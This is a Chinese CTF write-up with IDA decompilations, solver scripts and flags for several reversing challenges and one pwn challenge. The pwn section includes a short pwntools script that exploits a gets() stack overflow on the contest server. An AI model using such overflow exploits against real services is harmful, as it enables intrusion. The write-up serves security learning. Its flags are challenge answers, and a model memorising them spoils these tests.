这个比赛还算友好，而且少见的逆向比web还要多，出题人说之后会放源码和官方writeup，是个不错的学习的机会，这里把做出来的几道题先写一下（然后开始写作业……

### web

#### Welcome to Earth

我对web实际上是毫无兴趣的，但这题实在简单的过分，还是给做了，详细的就不说了，查看源码就可以发现，只要在调用`dead`之前进入到应该进去的页面就可以了（直接`F12`里debug暂停然后慢慢看就可以了……

### pwn

pwn也很久没做了，知识点还停留在刚学的时候，应付一下第一题就完事了

#### Department of Flying Vehicles

IDA打开~~(逆向看久了之后发现pwn题目的逻辑真的是简单得要命)~~，漏洞也看得出来，利用的话还是不熟练，需要多练

```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  char s1[8]; // [rsp+0h] [rbp-20h]
  __int64 v6; // [rsp+8h] [rbp-18h]
  __int64 v7; // [rsp+10h] [rbp-10h]
  unsigned __int64 v8; // [rsp+18h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  v6 = 1176165807576793170LL;
  v7 = 1154282520852565777LL;
  puts("Dave has ruined our system. He updated the code, and now he even has trouble checking his own liscense!");
  puts("If you can please make it work, we'll reward you!\n");
  puts("Welcome to the Department of Flying Vehicles.");
  printf("Which liscense plate would you like to examine?\n > ", 0LL);
  gets(s1);
  if ( v6 == (v7 ^ *(_QWORD *)s1) )
  {
    if ( !strncmp(s1, "COOLDAV", 8uLL) )
    {
      puts("Hi Dave!");
    }
    else
    {
      v3 = sub_96A("flag.txt", "COOLDAV");
      printf("Thank you so much! Here's your reward!\n%s", v3);
    }
  }
  else
  {
    puts("Error.");
  }
  return 0LL;
}
```

如果想要通过第一个if就必须要输入`COOLDAV`，这样的话就过不了第二个输入，看到`gets`直接考虑溢出覆盖变量的值，最简单的方法就是输入和其中的一个变量全都为`\0`

```python
from pwn import *

# io=process('./dfv')
io=remote('pwn.ctf.b01lers.com',1001)
io.recvuntil('Which liscense plate would you like to examine?\n > ')
payload=4*p64(0)

io.sendline(payload)
io.interactive()
```

就可以拿到flag~~(但我忘了记录flag得值又懒得再跑一遍拿flag)~~

### Re

#### Chugga Chugga

IDA打开

```cpp
void __fastcall __noreturn main_main(__int64 a1, __int64 a2)
{
  signed __int64 i; // rcx
  __int64 v3; // r8
  __int64 v4; // r9
  __int64 v5; // r8
  __int64 v6; // r9
  __int64 v7; // r8
  __int64 v8; // r9
  __int64 v9; // r8
  __int64 v10; // r9
  unsigned __int64 v11; // rcx
  _BYTE *v12; // rdx
  signed __int64 v13; // rax
  char v14; // bl
  char v15; // r10
  int v16; // er11
  char v17; // r12
  char v18; // r13
  int v19; // er13
  int v20; // er14
  int v21; // ecx
  int v22; // er14
  char v23; // cl
  unsigned int v24; // er13
  char v25; // r11
  char v26; // r12
  _QWORD *v27; // [rsp+8h] [rbp-A0h]
  signed __int64 v28; // [rsp+40h] [rbp-68h]
  _QWORD *v29; // [rsp+48h] [rbp-60h]
  __int128 v30; // [rsp+50h] [rbp-58h]
  __int128 v31; // [rsp+60h] [rbp-48h]
  __int128 v32; // [rsp+70h] [rbp-38h]
  __int128 v33; // [rsp+80h] [rbp-28h]
  __int128 v34; // [rsp+90h] [rbp-18h]

  if ( (unsigned __int64)&v33 <= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) )
    runtime_morestack_noctxt();
  runtime_newobject(a1, a2);
  v29 = v27;
  for ( i = 0LL; ; i = v13 )
  {
    v28 = i;
    runtime_convT64(a1, a2);
    *(_QWORD *)&v33 = &unk_4A4C40;
    *((_QWORD *)&v33 + 1) = &main_statictmp_2;
    *(_QWORD *)&v34 = &unk_4A4480;
    *((_QWORD *)&v34 + 1) = v27;
    a2 = (__int64)&go_itab__os_File_io_Writer;
    fmt_Fprintln(
      a1,
      (__int64)&go_itab__os_File_io_Writer,
      (__int64)&main_statictmp_2,
      (__int64)&unk_4A4C40,
      v3,
      v4,
      (__int64)&go_itab__os_File_io_Writer,
      os_Stdout);
    *(_QWORD *)&v32 = &unk_4A4C40;
    *((_QWORD *)&v32 + 1) = &main_statictmp_3;
    fmt_Fprintln(
      a1,
      (__int64)&go_itab__os_File_io_Writer,
      (__int64)&v32,
      (__int64)&main_statictmp_3,
      v5,
      v6,
      (__int64)&go_itab__os_File_io_Writer,
      os_Stdout);
    *(_QWORD *)&v31 = &unk_4A1DC0;
    *((_QWORD *)&v31 + 1) = v29;
    fmt_Fscan(
      a1,
      (__int64)&go_itab__os_File_io_Writer,
      (__int64)&v31,
      (__int64)v29,
      v7,
      v8,
      (__int64)&go_itab__os_File_io_Reader,
      os_Stdin);
    v11 = v29[1];
    v12 = (_BYTE *)*v29;
    if ( v11 <= 2 )
      break;
    if ( v12[2] != 116 )
      goto LABEL_39;
    if ( v11 <= 9 )
      break;
    a2 = (unsigned __int8)v12[9];
    if ( (_BYTE)a2 != 99 )
      goto LABEL_39;
    if ( v11 <= 0x10 )
      break;
    a1 = (unsigned __int8)v12[16];
    if ( (_BYTE)a1 != 110 )
      goto LABEL_39;
    if ( v11 <= 0x15 )
      break;
    v9 = (unsigned __int8)v12[21];
    if ( (_BYTE)v9 != 122 )
      goto LABEL_39;
    if ( v11 <= 0x16 )
      break;
    if ( v12[22] != 125 )
      goto LABEL_39;
    v10 = (unsigned __int8)v12[5];
    if ( 115 != (_BYTE)v10 )
      goto LABEL_39;
    if ( (v12[3] ^ 0x74) != 18 )
      goto LABEL_39;
    v14 = v12[1];
    if ( v14 != 99 )
      goto LABEL_39;
    a2 = (unsigned __int8)v12[7];
    if ( (_BYTE)a2 != 100 )
      goto LABEL_39;
    v15 = v12[13];
    if ( v12[12] != v15 )
      goto LABEL_39;
    if ( 122 != v12[19] )
      goto LABEL_39;
    v9 = (unsigned __int8)v12[14];
    v16 = (unsigned __int8)v12[6];
    if ( (_BYTE)v16 + (_BYTE)v9 != 104 )
      goto LABEL_39;
    v17 = v12[4];
    if ( 123 != v17 )
      goto LABEL_39;
    v18 = v12[8];
    if ( v12[15] != v18 )
      goto LABEL_39;
    if ( v18 + 4 != v14 )
      goto LABEL_39;
    v19 = (unsigned __int8)v12[17];
    v20 = (unsigned __int8)v12[11];
    if ( 125 - (_BYTE)v19 + 40 != (_BYTE)v20 )
      goto LABEL_39;
    v21 = (unsigned __int8)v12[18];
    v22 = v19 + v20 - v10 - v21;
    v23 = v21 - v19;
    if ( (_BYTE)v22 != v23
      || (v24 = v16 - v19, *v12 != v23 * ((unsigned __int8)v24 >> 1) + 110)
      || (v25 = v12[10], v15 + 1 != v25)
      || (v26 = v17 - a2, a2 = v24, (_BYTE)v24 + 2 * (_BYTE)v24 + 4 * v26 != v25)
      || v12[20] - v14 != 2 * v23
      || (v10 = (unsigned int)a1 ^ (unsigned int)v10, (_BYTE)v10 != 29)
      || (_BYTE)v24 != 4 * v23
      || v12[6] != (_BYTE)v9 )
    {
LABEL_39:
      *(_QWORD *)&v30 = &unk_4A4C40;
      *((_QWORD *)&v30 + 1) = &main_statictmp_4;
      fmt_Fprintln(
        a1,
        a2,
        (__int64)&v30,
        (__int64)&main_statictmp_4,
        v9,
        v10,
        (__int64)&go_itab__os_File_io_Writer,
        os_Stdout);
      v13 = v28 + 1;
    }
    else
    {
      main_win();
      v13 = v28;
    }
  }
  runtime_panicindex(a1, a2, v12);
}
```

所有的判断条件都在这个函数里，直接根据条件解出来flag就可以了，至于为什么不写具体的过程，因为我是在演草纸上自己动手解的方程，只要耐心分析就可以了

> 这里有一个疑问，标记一下，解方程的时候可以解出来两解，应该有地方可以排除掉，但我直接根据语义选择的flag

```
pctf{s4d_chugg4_n01zez}
```

#### Dank Engine

脑洞题~~(这游戏根本就玩不过去……~~

走到地图中间怎么都跳不上去，到了最右边发现不能走了但是地图没完，后面接着长长的一条路，所以一直往右边拉，看到`pctf`，找到了flag的位置

~~(然后为了找flag跑崩了四次虚拟机……显卡和cpu看样8太行)~~

用鼠标上下没法超出屏幕，用`alt+f7`移动窗口慢慢找，感觉应该有逆向方法，那个pck包我至今还没解开

```
PCTF{ITWASTIMEFORTHOMASTOGO_HEHADSEENEVERYTHING}
```

----

来补充一下，IDA可以直接打开pck包，里面有关于人物的设定

```cpp
'# Global Variables',0Ah
seg000:0000000000004610                 db 'var g_direction',0Ah
seg000:0000000000004610                 db 'var g_velocity',0Ah
seg000:0000000000004610                 db 'var g_parent',0Ah
seg000:0000000000004610                 db 'var g_airborne',0Ah
seg000:0000000000004610                 db 'var g_delta',0Ah
seg000:0000000000004610                 db 'var g_cheat_stack',0Ah
seg000:0000000000004610                 db 'var g_god_mode',0Ah
```

惊奇的发现下面还有一个上帝模式和开启方法

```cpp
 db 9,'if self.g_cheat_stack == ["P", "U", "R", "G", "0", "0"]:',0Ah
seg000:0000000000004610                 db 9,9,'self.g_god_mode = not self.g_god_mode',0Ah
seg000:0000000000004610                 db 9,9,'$CollisionShape2D.disabled = not $CollisionShape2D.disabled',0Ah
```

方法就是按键直接输入`PURG00`，打开之后就可以飞和穿墙，直接跑到flag在的地方去看就可以了

~~(亏我还调窗口大小调了这么久)~~

#### Digital Sloth

这题的逻辑很简单

```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed int v3; // esi
  signed __int64 v4; // rdx
  signed __int64 v5; // r12
  int *v6; // r13
  __int64 v7; // rax
  signed __int64 v8; // rbp
  unsigned __int64 v9; // rdx
  signed int v10; // eax
  int v11; // edi
  int v12; // ecx
  __int64 v14; // [rsp+0h] [rbp-68h]
  __int64 v15; // [rsp+8h] [rbp-60h]
  __int64 v16; // [rsp+10h] [rbp-58h]
  __int64 v17; // [rsp+18h] [rbp-50h]
  __int64 v18; // [rsp+20h] [rbp-48h]
  __int64 v19; // [rsp+28h] [rbp-40h]
  int v20; // [rsp+30h] [rbp-38h]
  int v21; // [rsp+34h] [rbp-34h]
  unsigned __int64 v22; // [rsp+38h] [rbp-30h]

  v3 = 51;
  v4 = 3LL;
  v5 = 113LL;
  v22 = __readfsqword(0x28u);
  v20 = 1422670297;
  v14 = -3319278099595541965LL;
  v6 = (int *)((char *)&v14 + 1);
  v15 = -422936419575592362LL;
  v16 = -4095196370651919852LL;
  v17 = 8155891993347461205LL;
  v18 = 2743091852077296222LL;
  v19 = -5317187183026317550LL;
  while ( 1 )
  {
    v7 = 0LL;
    v8 = 1LL;
    if ( v4 )
    {
      do
      {
        ++v7;
        v8 *= v5;
      }
      while ( v7 != v4 );
    }
    v9 = v8;
    v10 = 8;
    v11 = 0;
    do
    {
      v12 = (unsigned __int8)v9;
      v9 >>= 8;
      v11 ^= v12;
      --v10;
    }
    while ( v10 );
    _IO_putc(v3 ^ v11, stdout);
    fflush(stdout);
    if ( &v21 == v6 )
      break;
    v3 = *(unsigned __int8 *)v6;
    v4 = v5;
    v6 = (int *)((char *)v6 + 1);
    v5 = v8;
  }
  return 0LL;
}
```

直接会输出flag的那种，但是一运行只输出了三个字符，明显是计算大数乘幂的时候算法时间复杂度太高了(**O(n^2)**)，想要算出flag必须手动优化一下算法，利用平方把时间复杂度优化到**O(logn)**，在大数的时候明显优化的不是一点

```cpp
#include <iostream>

using namespace std;

typedef unsigned long long ull;

ull qpow(ull x, ull n) {
    ull res = 1;
    ull mod = 0xffffffffffffffff;
    while (n) {
        if (n & 1)
            res = res * x & mod;    //如果二进制最低位为1，则乘上x^(2^i)
        x = x * x & mod;
        n >>= 1;
    }
    return res;
}

int main() {
    ull v4; // rdx
    ull v5; // r12
    ull v8; // rbp
    ull v9; // rdx
    signed int v10; // eax
    int v11; // edi
    int v12; // ecx

    v4 = 3;
    v5 = 113;

    int v3[] = {0x33, 0xC2, 0xDF, 0x9A, 0x27, 0x8E, 0xEF, 0xD1, 0x56, 0x0A, 0x9F, 0x34, 0x91, 0x6D, 0x21, 0xFA,
                0x14, 0xCA, 0xD2, 0x21, 0x99, 0xF0, 0x2A, 0xC7, 0x55, 0x90, 0xED, 0x61, 0x8E, 0x8C, 0x2F, 0x71,
                0x5E, 0xEA, 0x55, 0x85, 0x81, 0x6B, 0x11, 0x26, 0x12, 0xD7, 0x74, 0xBF, 0x6D, 0x8E, 0x35, 0xB6,
                0xD9, 0x39, 0xCC, 0x54};
    for (int i = 0; i < 52; i++) {

        v8 = 1;
        if (v4) {
            v8 *= qpow(v5, v4);
        }
        v9 = v8;
        v10 = 8;
        v11 = 0;
        do {
            v12 = v9 & 0xff;
            v9 >>= 8;
            v11 ^= v12;
            --v10;
        } while (v10);
        char tmp=v3[i] ^ v11;
        cout << tmp;
        v4 = v5;
        v5 = v8;
    }
    return 0;
}
```

---

又是一道分割线，看了其它大佬的wp才知道……直接用python的`pow`不就好了……

直接输出flag

```
pctf{one man's trash is another man's V#x0GFu_Lp%3}
```

~~看到最后一段甚至感觉做错了，到现在没看懂~~

#### train_arms

~~arm一语双关，妙啊~~

这题就直接看汇编了

```asm6502
.cpu cortex-m0
.thumb
.syntax unified
.fpu softvfp


.data 
    flag: .string "REDACTED" //len = 28

.text
.global main
main:
    ldr r0,=flag
    eors r1,r1
    eors r2,r2
    movs r7,#1				; r7=1
    movs r6,#42				; r6=42
loop:
    ldrb r2,[r0,r1]
    cmp r2,#0
    beq exit
    lsls r3,r1,#0
    ands r3,r7				; 区分奇偶位
    cmp r3,#0
    bne f1//if odd
    strb r2,[r0,r1]
    adds r1,#1
    b loop
f1:
    eors r2,r6
    strb r2,[r0,r1]
    adds r1,#1
    b loop

exit:
    wfi
```

虽然没怎么接触过arm的汇编，但是这里还是很容易的，把flag分奇偶位进行操作，奇数位不动，偶数位异或42，最终结果输出到文件，所以打开文件

```
7049744c7b5e721e31447375641a6e5e5f42345c337561586d597d
```

明显16进制输出，写个脚本跑一下

```python
target = [0x70, 0x49, 0x74, 0x4c, 0x7b, 0x5e, 0x72, 0x1e, 0x31, 0x44, 0x73, 0x75, 0x64, 0x1a, 0x6e, 0x5e, 0x5f, 0x42,
          0x34, 0x5c, 0x33, 0x75, 0x61, 0x58, 0x6d, 0x59, 0x7d]
flag = ''
for i in range(len(target)):
    if i & 1:
        flag += chr(target[i] ^ 42)
    else:
        flag += chr(target[i])
print(flag)
```

直接输出flag

```
pctf{tr41ns_d0nt_h4v3_arms}
```

#### Little Engine

> 我觉得这题很不错，难度比较适中，还可以加深对于数据在内存中占用位数的理解

```cpp
__int64 __usercall main@<rax>(__int64 a1@<rdi>, char **a2@<rsi>, char **a3@<rdx>, __int64 a4@<rbx>, _QWORD *a5@<r12>)
{
  signed __int64 v5; // rdx
  unsigned __int64 v6; // rcx
  const char *v7; // rsi
  __int64 v8; // rdx
  __int64 v9; // rcx
  __int64 v10; // rdi
  __int64 v12; // [rsp+0h] [rbp-28h]
  unsigned __int64 v13; // [rsp+18h] [rbp-10h]

  __asm { endbr64 }
  v13 = __readfsqword(0x28u);
  sub_16B0(a1, a2, a3);
  sub_1830(&v12);
  sub_1510(v5, v6, a4, &v12, &v12, (unsigned __int64)a2, a5);
  if ( (unsigned __int8)sub_15A0(&v12) )
  {
    v7 = "Chugga chugga choo choo you're the little engine that CAN!";
    sub_11F0(&std::cout, "Chugga chugga choo choo you're the little engine that CAN!", 58LL);
  }
  else
  {
    v7 = "I guess you don't know anything about trains...go do some TRAINing you non-conductor :(";
    sub_11F0(
      &std::cout,
      "I guess you don't know anything about trains...go do some TRAINing you non-conductor :(",
      87LL);
  }
  sub_1170(&std::cout);
  v10 = v12;
  if ( v12 )
    sub_11C0(v12, v7, v8, v9);
  if ( __readfsqword(0x28u) != v13 )
  {
    sub_11E0(v10, v7, v8, v9);
    __asm { endbr64 }
    JUMPOUT(&loc_12D1);
  }
  return 0LL;
}
```

话好多，第一句说明正确，第二句说明错误，逻辑就很清楚了，if的条件是一个用来判断的函数

程序在`sub_1830()`里进行输入，在`sub_1510()`进行了一些处理然后判断

```cpp
__int64 *__fastcall sub_1830(__int64 *a1)
{
  __int64 *v1; // r12
  unsigned __int64 v2; // rsi
  unsigned __int8 *v3; // rdx
  __int64 v4; // rcx
  __int64 v5; // rbx
  __int64 v6; // r13
  __int64 v7; // rax
  char *v8; // rdi
  char *v9; // r8
  __int64 v10; // rdx
  _BYTE *v11; // rax
  char *v13; // [rsp+0h] [rbp-58h]
  __int64 v14; // [rsp+8h] [rbp-50h]
  char v15; // [rsp+10h] [rbp-48h]
  unsigned __int64 v16; // [rsp+28h] [rbp-30h]

  __asm { endbr64 }
  v1 = a1;
  v16 = __readfsqword(0x28u);
  sub_11F0(&std::cout, "Now, I hope you're a total trainiac. Give me your best tidbit: ", 63LL);
  v2 = (unsigned __int64)&v13;
  v13 = &v15;
  v14 = 0LL;
  v15 = 0;
  sub_1220(&std::cin, &v13);
  v5 = v14;
  v6 = (__int64)v13;
  a1[2] = 0LL;
  *(_OWORD *)a1 = 0LL;
  if ( v5 < 0 )
  {
LABEL_32:
    sub_1190("cannot create std::vector larger than max_size()");
    __asm { endbr64 }
    JUMPOUT(&loc_12AA);
  }
  if ( v5 )
  {
    v7 = sub_11D0(v5);
    v8 = (char *)(v7 + v5);
    *v1 = v7;
    v9 = v13;
    v1[2] = v7 + v5;
    if ( (unsigned __int64)(v6 + 15 - v7) <= 0x1E || (unsigned __int64)(v5 - 1) <= 0xE )
    {
      v3 = 0LL;
      do
      {
        v4 = v3[v6];
        (v3++)[v7] = v4;
      }
      while ( (unsigned __int8 *)v5 != v3 );
    }
    else
    {
      v10 = 0LL;
      do
      {
        *(__m128i *)(v7 + v10) = _mm_loadu_si128((const __m128i *)(v6 + v10));
        v10 += 16LL;
      }
      while ( v10 != (v5 & 0xFFFFFFFFFFFFFFF0LL) );
      v2 = v5 & 0xFFFFFFFFFFFFFFF0LL;
      v4 = v5 & 0xF;
      v3 = (unsigned __int8 *)(v6 + (v5 & 0xFFFFFFFFFFFFFFF0LL));
      v11 = (_BYTE *)((v5 & 0xFFFFFFFFFFFFFFF0LL) + v7);
      if ( v5 != (v5 & 0xFFFFFFFFFFFFFFF0LL) )
      {
        v2 = *v3;
        *v11 = v2;
        if ( v4 != 1 )
        {
          v2 = v3[1];
          v11[1] = v2;
          if ( v4 != 2 )
          {
            v2 = v3[2];
            v11[2] = v2;
            if ( v4 != 3 )
            {
              v2 = v3[3];
              v11[3] = v2;
              if ( v4 != 4 )
              {
                v2 = v3[4];
                v11[4] = v2;
                if ( v4 != 5 )
                {
                  v2 = v3[5];
                  v11[5] = v2;
                  if ( v4 != 6 )
                  {
                    v2 = v3[6];
                    v11[6] = v2;
                    if ( v4 != 7 )
                    {
                      v2 = v3[7];
                      v11[7] = v2;
                      if ( v4 != 8 )
                      {
                        v2 = v3[8];
                        v11[8] = v2;
                        if ( v4 != 9 )
                        {
                          v2 = v3[9];
                          v11[9] = v2;
                          if ( v4 != 10 )
                          {
                            v2 = v3[10];
                            v11[10] = v2;
                            if ( v4 != 11 )
                            {
                              v2 = v3[11];
                              v11[11] = v2;
                              if ( v4 != 12 )
                              {
                                v2 = v3[12];
                                v11[12] = v2;
                                if ( v4 != 13 )
                                {
                                  v2 = v3[13];
                                  v11[13] = v2;
                                  if ( v4 != 14 )
                                  {
                                    v3 = (unsigned __int8 *)v3[14];
                                    v11[14] = (_BYTE)v3;
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  else
  {
    v9 = (char *)v6;
    v8 = 0LL;
  }
  v1[1] = (__int64)v8;
  if ( v9 != &v15 )
  {
    v8 = v9;
    sub_11C0(v9, v2, v3, v4);
  }
  if ( __readfsqword(0x28u) != v16 )
  {
    sub_11E0(v8, v2, v3, v4);
    goto LABEL_32;
  }
  return v1;
}
```

程序看起来异常复杂，但是经过我的仔细分(tiao)析(shi)，发现只是把输入拷贝到了内存里分配好的空间。

```cpp
__int64 __usercall sub_1510@<rax>(signed __int64 a1@<rdx>, unsigned __int64 a2@<rcx>, __int64 a3@<rbx>, void *a4@<rbp>, __int64 *a5@<rdi>, unsigned __int64 a6@<rsi>, _QWORD *a7@<r12>)
{
  _QWORD *v7; // rax
  __int64 v8; // rdx
  __int64 v9; // rcx
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // rdx
  __int64 v13; // rcx
  char **v14; // rdx
  __int64 v15; // rax
  _BYTE *v16; // rax
  __int64 v17; // rcx
  __int64 v18; // rcx
  __int64 result; // rax
  unsigned __int64 v20; // rt1
  unsigned __int64 v21; // [rsp+18h] [rbp-10h]
  void *retaddr; // [rsp+28h] [rbp+0h]

  __asm { endbr64 }
  v21 = __readfsqword(0x28u);
  v15 = *a5;
  if ( *a5 == a5[1] )
  {
LABEL_5:
    v20 = __readfsqword(0x28u);
    result = v20 ^ v21;
    if ( v20 != v21 )
    {
      sub_11E0(a5, a6, a1, a2);
      result = sub_15A0(a5);
    }
  }
  else
  {
    a6 = 0LL;
    a1 = 4294967185LL;
    while ( 1 )
    {
      v16 = (_BYTE *)(a6 + v15);
      v17 = (unsigned __int8)*v16;
      if ( (_BYTE)v17 == 10 )
        break;
      *v16 = a1 ^ v17;
      v18 = (unsigned __int8)a1 + a6++;
      v15 = *a5;
      a1 = (unsigned int)v18
         + (unsigned int)((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v18 >> 64) >> 7);
      a2 = a5[1] - *a5;
      if ( a6 >= a2 )
        goto LABEL_5;
    }
    v7 = (_QWORD *)sub_1180(8LL, a6, a1, v17, -9187201950435737471LL);
    *v7 = &unk_3CD0;
    sub_1250(v7, &`typeinfo for'std::exception, &std::exception::~exception);
    sub_11C0(a4, &`typeinfo for'std::exception, v8, v9);
    sub_1260(a7);
    if ( *a7 )
      sub_11C0(*a7, &`typeinfo for'std::exception, v10, v11);
    if ( retaddr != a4 )
      sub_11C0(retaddr, &`typeinfo for'std::exception, v10, v11);
    sub_1260(a3);
    if ( retaddr )
      sub_11C0(retaddr, &`typeinfo for'std::exception, v12, v13);
    sub_1260(a4);
    result = main((__int64)a4, (char **)&`typeinfo for'std::exception, v14);
  }
  return result;
}
```

这又是一个异常复杂的函数，但实际上有用的内容并不多

```cpp
 	a6 = 0LL;
    a1 = 4294967185LL;
    while ( 1 )
    {
      v16 = (_BYTE *)(a6 + v15);
      v17 = (unsigned __int8)*v16;
      if ( (_BYTE)v17 == 10 )
        break;
      *v16 = a1 ^ v17;
      v18 = (unsigned __int8)a1 + a6++;
      v15 = *a5;
      a1 = (unsigned int)v18
         + (unsigned int)((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v18 >> 64) >> 7);
      a2 = a5[1] - *a5;
      if ( a6 >= a2 )
        goto LABEL_5;
    }
```

只有这里是对输入的处理，整个处理过程也就只有一个异或而已，这里比较有意思的是循环停止的判断条件，`a5`实际上是个数组，里面存放了两个地址，一个是我们输入的字符串开始的地址，另一个是结束的地址，实际上相减出来的值就是字符串的长度，但是看起来就比较复杂，逆向的时候理解起来就有些困难。

这里的处理其实很好办，`a1`这个值和我们的输入没关系，是循环中依据算法生成的，我们可以通过同样的算法生成，然后存放在一个数组里。

接下来是判断函数

```cpp
__int64 __fastcall sub_15A0(__int64 *a1)
{
  _QWORD *v1; // rbp
  __int64 v2; // rsi
  __int64 v3; // rcx
  __int64 v4; // rdx
  unsigned int v5; // er12
  const char *v6; // rdi
  __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 v10; // [rsp+0h] [rbp-158h]
  __int64 v11; // [rsp+124h] [rbp-34h]
  unsigned __int64 v12; // [rsp+138h] [rbp-20h]

  __asm { endbr64 }
  v12 = __readfsqword(0x28u);
  qmemcpy(&v10, &unk_2220, 0x12CuLL);
  v1 = (_QWORD *)sub_11D0(300LL);
  *v1 = v10;
  *(_QWORD *)((char *)v1 + 292) = v11;
  qmemcpy(
    (void *)((unsigned __int64)(v1 + 1) & 0xFFFFFFFFFFFFFFF8LL),
    (const void *)((char *)&v10 - ((char *)v1 - ((unsigned __int64)(v1 + 1) & 0xFFFFFFFFFFFFFFF8LL))),
    8LL * (((unsigned int)v1 - (((_DWORD)v1 + 8) & 0xFFFFFFF8) + 300) >> 3));
  v2 = 0LL;
  v3 = *a1;
  v4 = a1[1] - *a1;
  while ( 1 )
  {
    if ( v2 == v4 )
    {
      v6 = "vector::_M_range_check: __n (which is %zu) >= this->size() (which is %zu)";
      sub_1230("vector::_M_range_check: __n (which is %zu) >= this->size() (which is %zu)", v2, v2);
      goto LABEL_10;
    }
    if ( *((_BYTE *)v1 + 4 * v2) != *(_BYTE *)(v3 + v2) )
      break;
    if ( ++v2 == 75 )
    {
      v5 = 1;
      goto LABEL_6;
    }
  }
  v5 = 0;
LABEL_6:
  v6 = (const char *)v1;
  sub_11C0(v1, v2, v4, v3);
  if ( __readfsqword(0x28u) != v12 )
  {
LABEL_10:
    sub_11E0(v6, v2, v7, v8);
    __asm { endbr64 }
    JUMPOUT(&loc_129A);
  }
  return v5;
}
```

各种操作看着吓人，仔细一看，只有一个直接比较

```cpp
if ( *((_BYTE *)v1 + 4 * v2) != *(_BYTE *)(v3 + v2) )
```

前面的生成方式很复杂，但是可以不用去管，通过动态调试就可以调试出来目标数组，不过目标生成出来都是64位数据，比较的时候只取最低8位进行比较，还需要进行一些处理。

然后直接把处理过后的目标数组和之前依据相同算法生成出来的数组逐项异或就可以得到flag

```cpp
#include <iostream>
#include "ida.h"

using namespace std;

int main() {
    unsigned __int64 a5;
    signed __int64 v8; // rdx
    unsigned __int64 v11; // rcx
    a5 = 0LL;
    v8 = 0xFFFFFF91LL;
    ll v8s[75];
    v8s[0] = 0x91;
    ll target[] = {0xE1, 0xF2, 0xE6, 0xF2, 0xEC, 0xEF, 0xC8, 0x95, 0xF2, 0xD8, 0x8E, 0xAC, 0xE0, 0xAD, 0x82, 0xA5, 0x79,
                   0x6E, 0x18, 0x09, 0x3D, 0x3B, 0x4A, 0xE1, 0xC1, 0x8F, 0xB9, 0xC2, 0x52, 0x5E, 0x72, 0x51, 0xDC, 0x92,
                   0xAA, 0x90, 0x39, 0x40, 0x27, 0x4A, 0xC4, 0x97, 0xC0, 0x72, 0x18, 0x42, 0x96, 0xF7, 0xC5, 0x71, 0x3D,
                   0xE4, 0x90, 0xA7, 0x5A, 0x0C, 0xA8, 0x8C, 0x6F, 0x74, 0xF1, 0xCA, 0xA4, 0x0A, 0x17, 0x8A, 0xA5, 0x54,
                   0xEE, 0x9B, 0x3B, 0x69, 0xA3, 0xEF, 0x54};
    while (a5 < 75) {
        v11 = (unsigned __int8) v8 + a5++;
        v8 = (unsigned int) v11 +
             (unsigned int) ((unsigned __int64) (0x8080808080808081LL * (unsigned __int128) v11 >> 64) >> 7);
        v8s[a5] = v8;
    }
    string flag;
    for (int i = 0; i < 75; i++) {
        char tmp = target[i] ^v8s[i];
        flag += tmp;
    }
    cout << flag << endl;
    return 0;
}
```

输出的flag为

```
pctf{th3_m0d3rn_st34m_3ng1n3_w45_1nv3nt3d_1n_1698_buT_th3_b3st_0n3_in_1940}
```